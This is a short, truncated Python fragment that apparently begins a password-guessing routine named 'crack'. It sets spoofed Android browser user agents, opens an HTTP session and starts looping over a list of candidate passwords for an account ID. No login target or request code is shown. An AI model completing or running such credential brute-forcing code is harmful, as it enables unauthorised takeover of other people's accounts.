...
def crack(idf,pwv):
	...
	ua ='Mozilla/5.0 (Linux; Android 12; V2109; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.3.0'
	ua2 ='Mozilla/5.0 (Linux; Android 12; V2109; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.3.0'
	ses = requests.Session()
	for pw in pwv:
		try:
